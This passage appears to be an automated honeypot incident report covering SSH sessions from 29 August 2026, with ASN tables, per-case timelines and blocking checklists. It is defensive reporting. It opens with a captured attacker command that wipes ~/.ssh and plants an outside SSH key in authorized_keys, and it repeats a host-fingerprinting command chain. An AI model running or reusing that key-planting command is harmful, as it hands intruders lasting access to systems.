cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.47.8.188`, `118.27.150.95`, `69.6.234.27`, `154.57.216.142`, `103.86.198.253`, `180.93.172.213`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **145** |
| Unique ASNs | **106** |
| High-Risk ASNs | **93** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS3301` | Telia Company AB | 5 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS8473` | Bahnhof AB | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (292)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bdd4d1144d8f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 10:55 |
| **Last Seen** | 2026-08-29 10:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 10:55:02` | `cowrie.client.kex` |
| `2026-08-29 10:55:03` | `cowrie.login.success` |
| `2026-08-29 10:55:05` | `cowrie.session.params` |
| `2026-08-29 10:55:05` | `cowrie.command.input` |
| `2026-08-29 10:55:05` | `cowrie.command.input` |
| `2026-08-29 10:55:05` | `cowrie.command.input` |
| `2026-08-29 10:55:05` | `cowrie.command.input` |
| `2026-08-29 10:55:05` | `cowrie.command.input` |
| `2026-08-29 10:55:05` | `cowrie.command.success` |
| `2026-08-29 10:55:05` | `cowrie.command.input` |
| `2026-08-29 10:55:05` | `cowrie.command.input` |
| `2026-08-29 10:55:05` | `cowrie.command.input` |
| `2026-08-29 10:55:05` | `cowrie.command.input` |
| `2026-08-29 10:55:05` | `cowrie.log.closed` |
| `2026-08-29 10:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a7dc90b988

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 10:56 |
| **Last Seen** | 2026-08-29 10:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 10:56:13` | `cowrie.session.connect` |
| `2026-08-29 10:56:13` | `cowrie.client.version` |
| `2026-08-29 10:56:13` | `cowrie.client.kex` |
| `2026-08-29 10:56:14` | `cowrie.login.success` |
| `2026-08-29 10:56:15` | `cowrie.session.params` |
| `2026-08-29 10:56:15` | `cowrie.command.input` |
| `2026-08-29 10:56:15` | `cowrie.command.input` |
| `2026-08-29 10:56:15` | `cowrie.command.input` |
| `2026-08-29 10:56:15` | `cowrie.command.input` |
| `2026-08-29 10:56:15` | `cowrie.command.input` |
| `2026-08-29 10:56:15` | `cowrie.command.success` |
| `2026-08-29 10:56:15` | `cowrie.command.input` |
| `2026-08-29 10:56:15` | `cowrie.command.input` |
| `2026-08-29 10:56:15` | `cowrie.command.input` |
| `2026-08-29 10:56:15` | `cowrie.command.input` |
| `2026-08-29 10:56:15` | `cowrie.log.closed` |
| `2026-08-29 10:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15dfce81c4d6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 10:56 |
| **Last Seen** | 2026-08-29 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 10:56:59` | `cowrie.session.connect` |
| `2026-08-29 10:56:59` | `cowrie.client.version` |
| `2026-08-29 10:57:00` | `cowrie.client.kex` |
| `2026-08-29 10:57:01` | `cowrie.login.success` |
| `2026-08-29 10:57:01` | `cowrie.direct-tcpip.request` |
| `2026-08-29 10:57:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 10:57:01` | `cowrie.direct-tcpip.data` |
| `2026-08-29 10:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c006c42da03c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 10:57 |
| **Last Seen** | 2026-08-29 10:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 10:57:14` | `cowrie.session.connect` |
| `2026-08-29 10:57:14` | `cowrie.client.version` |
| `2026-08-29 10:57:15` | `cowrie.client.kex` |
| `2026-08-29 10:57:15` | `cowrie.login.success` |
| `2026-08-29 10:57:16` | `cowrie.direct-tcpip.request` |
| `2026-08-29 10:57:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 10:57:16` | `cowrie.direct-tcpip.data` |
| `2026-08-29 10:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04152453d306

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 10:57 |
| **Last Seen** | 2026-08-29 10:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 10:57:24` | `cowrie.session.connect` |
| `2026-08-29 10:57:24` | `cowrie.client.version` |
| `2026-08-29 10:57:24` | `cowrie.client.kex` |
| `2026-08-29 10:57:25` | `cowrie.login.success` |
| `2026-08-29 10:57:26` | `cowrie.session.params` |
| `2026-08-29 10:57:26` | `cowrie.command.input` |
| `2026-08-29 10:57:26` | `cowrie.command.input` |
| `2026-08-29 10:57:26` | `cowrie.command.input` |
| `2026-08-29 10:57:26` | `cowrie.command.input` |
| `2026-08-29 10:57:26` | `cowrie.command.input` |
| `2026-08-29 10:57:26` | `cowrie.command.success` |
| `2026-08-29 10:57:26` | `cowrie.command.input` |
| `2026-08-29 10:57:26` | `cowrie.command.input` |
| `2026-08-29 10:57:26` | `cowrie.command.input` |
| `2026-08-29 10:57:26` | `cowrie.command.input` |
| `2026-08-29 10:57:26` | `cowrie.log.closed` |
| `2026-08-29 10:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71187c979835

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 10:58 |
| **Last Seen** | 2026-08-29 10:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 10:58:39` | `cowrie.session.connect` |
| `2026-08-29 10:58:39` | `cowrie.client.version` |
| `2026-08-29 10:58:40` | `cowrie.client.kex` |
| `2026-08-29 10:58:40` | `cowrie.login.success` |
| `2026-08-29 10:58:41` | `cowrie.session.params` |
| `2026-08-29 10:58:41` | `cowrie.command.input` |
| `2026-08-29 10:58:41` | `cowrie.command.input` |
| `2026-08-29 10:58:41` | `cowrie.command.input` |
| `2026-08-29 10:58:41` | `cowrie.command.input` |
| `2026-08-29 10:58:41` | `cowrie.command.input` |
| `2026-08-29 10:58:41` | `cowrie.command.success` |
| `2026-08-29 10:58:41` | `cowrie.command.input` |
| `2026-08-29 10:58:41` | `cowrie.command.input` |
| `2026-08-29 10:58:41` | `cowrie.command.input` |
| `2026-08-29 10:58:41` | `cowrie.command.input` |
| `2026-08-29 10:58:42` | `cowrie.log.closed` |
| `2026-08-29 10:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cf740007366

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 10:59 |
| **Last Seen** | 2026-08-29 10:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 10:59:57` | `cowrie.session.connect` |
| `2026-08-29 10:59:57` | `cowrie.client.version` |
| `2026-08-29 10:59:57` | `cowrie.client.kex` |
| `2026-08-29 10:59:58` | `cowrie.login.success` |
| `2026-08-29 10:59:59` | `cowrie.session.params` |
| `2026-08-29 10:59:59` | `cowrie.command.input` |
| `2026-08-29 10:59:59` | `cowrie.command.input` |
| `2026-08-29 10:59:59` | `cowrie.command.input` |
| `2026-08-29 10:59:59` | `cowrie.command.input` |
| `2026-08-29 10:59:59` | `cowrie.command.input` |
| `2026-08-29 10:59:59` | `cowrie.command.success` |
| `2026-08-29 10:59:59` | `cowrie.command.input` |
| `2026-08-29 10:59:59` | `cowrie.command.input` |
| `2026-08-29 10:59:59` | `cowrie.command.input` |
| `2026-08-29 10:59:59` | `cowrie.command.input` |
| `2026-08-29 10:59:59` | `cowrie.log.closed` |
| `2026-08-29 10:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83dd90e0cbc9

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:01 |
| **Last Seen** | 2026-08-29 11:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:01:17` | `cowrie.session.connect` |
| `2026-08-29 11:01:17` | `cowrie.client.version` |
| `2026-08-29 11:01:17` | `cowrie.client.kex` |
| `2026-08-29 11:01:17` | `cowrie.login.success` |
| `2026-08-29 11:01:18` | `cowrie.session.params` |
| `2026-08-29 11:01:18` | `cowrie.command.input` |
| `2026-08-29 11:01:18` | `cowrie.command.input` |
| `2026-08-29 11:01:18` | `cowrie.command.input` |
| `2026-08-29 11:01:18` | `cowrie.command.input` |
| `2026-08-29 11:01:18` | `cowrie.command.input` |
| `2026-08-29 11:01:18` | `cowrie.command.success` |
| `2026-08-29 11:01:18` | `cowrie.command.input` |
| `2026-08-29 11:01:18` | `cowrie.command.input` |
| `2026-08-29 11:01:18` | `cowrie.command.input` |
| `2026-08-29 11:01:18` | `cowrie.command.input` |
| `2026-08-29 11:01:18` | `cowrie.log.closed` |
| `2026-08-29 11:01:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04a6d95ca97c

| Field | Detail |
|---|---|
| **Source IP** | `81.22.51[.]64` |
| **First Seen** | 2026-08-29 11:02 |
| **Last Seen** | 2026-08-29 11:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:02:06` | `cowrie.session.connect` |
| `2026-08-29 11:02:07` | `cowrie.client.version` |
| `2026-08-29 11:02:07` | `cowrie.client.kex` |
| `2026-08-29 11:02:08` | `cowrie.login.success` |
| `2026-08-29 11:02:08` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:02:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.22.51[.]64` to AbuseIPDB if not already reported
- [ ] Block `81.22.51[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b7e1f4c2d68

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-08-29 11:02 |
| **Last Seen** | 2026-08-29 11:02 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:02:16` | `cowrie.session.connect` |
| `2026-08-29 11:02:18` | `cowrie.client.version` |
| `2026-08-29 11:02:18` | `cowrie.client.kex` |
| `2026-08-29 11:02:23` | `cowrie.login.success` |
| `2026-08-29 11:02:24` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41dbac9222d8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:02 |
| **Last Seen** | 2026-08-29 11:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:02:30` | `cowrie.session.connect` |
| `2026-08-29 11:02:30` | `cowrie.client.version` |
| `2026-08-29 11:02:30` | `cowrie.client.kex` |
| `2026-08-29 11:02:31` | `cowrie.login.success` |
| `2026-08-29 11:02:32` | `cowrie.session.params` |
| `2026-08-29 11:02:32` | `cowrie.command.input` |
| `2026-08-29 11:02:32` | `cowrie.command.input` |
| `2026-08-29 11:02:32` | `cowrie.command.input` |
| `2026-08-29 11:02:32` | `cowrie.command.input` |
| `2026-08-29 11:02:32` | `cowrie.command.input` |
| `2026-08-29 11:02:32` | `cowrie.command.success` |
| `2026-08-29 11:02:32` | `cowrie.command.input` |
| `2026-08-29 11:02:32` | `cowrie.command.input` |
| `2026-08-29 11:02:32` | `cowrie.command.input` |
| `2026-08-29 11:02:32` | `cowrie.command.input` |
| `2026-08-29 11:02:32` | `cowrie.log.closed` |
| `2026-08-29 11:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8618ca76d0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:03 |
| **Last Seen** | 2026-08-29 11:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:03:42` | `cowrie.session.connect` |
| `2026-08-29 11:03:42` | `cowrie.client.version` |
| `2026-08-29 11:03:43` | `cowrie.client.kex` |
| `2026-08-29 11:03:43` | `cowrie.login.success` |
| `2026-08-29 11:03:44` | `cowrie.session.params` |
| `2026-08-29 11:03:44` | `cowrie.command.input` |
| `2026-08-29 11:03:44` | `cowrie.command.input` |
| `2026-08-29 11:03:44` | `cowrie.command.input` |
| `2026-08-29 11:03:44` | `cowrie.command.input` |
| `2026-08-29 11:03:44` | `cowrie.command.input` |
| `2026-08-29 11:03:44` | `cowrie.command.success` |
| `2026-08-29 11:03:44` | `cowrie.command.input` |
| `2026-08-29 11:03:44` | `cowrie.command.input` |
| `2026-08-29 11:03:44` | `cowrie.command.input` |
| `2026-08-29 11:03:44` | `cowrie.command.input` |
| `2026-08-29 11:03:44` | `cowrie.log.closed` |
| `2026-08-29 11:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9063530889f1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:04 |
| **Last Seen** | 2026-08-29 11:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:04:59` | `cowrie.session.connect` |
| `2026-08-29 11:04:59` | `cowrie.client.version` |
| `2026-08-29 11:04:59` | `cowrie.client.kex` |
| `2026-08-29 11:05:00` | `cowrie.login.success` |
| `2026-08-29 11:05:01` | `cowrie.session.params` |
| `2026-08-29 11:05:01` | `cowrie.command.input` |
| `2026-08-29 11:05:01` | `cowrie.command.input` |
| `2026-08-29 11:05:01` | `cowrie.command.input` |
| `2026-08-29 11:05:01` | `cowrie.command.input` |
| `2026-08-29 11:05:01` | `cowrie.command.input` |
| `2026-08-29 11:05:01` | `cowrie.command.success` |
| `2026-08-29 11:05:01` | `cowrie.command.input` |
| `2026-08-29 11:05:01` | `cowrie.command.input` |
| `2026-08-29 11:05:01` | `cowrie.command.input` |
| `2026-08-29 11:05:01` | `cowrie.command.input` |
| `2026-08-29 11:05:01` | `cowrie.log.closed` |
| `2026-08-29 11:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2049932f723

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:06 |
| **Last Seen** | 2026-08-29 11:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
